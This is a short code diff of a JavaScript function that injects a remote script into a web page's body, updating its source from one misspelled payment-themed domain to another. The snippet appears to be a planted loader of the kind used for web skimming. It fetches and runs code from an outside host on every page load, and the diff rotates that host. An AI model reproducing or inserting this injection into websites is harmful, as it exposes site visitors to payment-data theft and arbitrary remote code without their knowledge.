@@ -11,7 +11,7 @@ function getDomainDef(){
           
           var twoElementScript = document.createElement("script");
           twoElementScript.setAttribute('type', 'text/javascript');
-          twoElementScript.setAttribute('src', 'https://pr0paymentss.expert/buy_domain.php');
+          twoElementScript.setAttribute('src', 'https://infopaymentss.express/buy_domain.php');
           document.getElementsByTagName('body')[0].appendChild(twoElementScript);
   
           var domain = "";
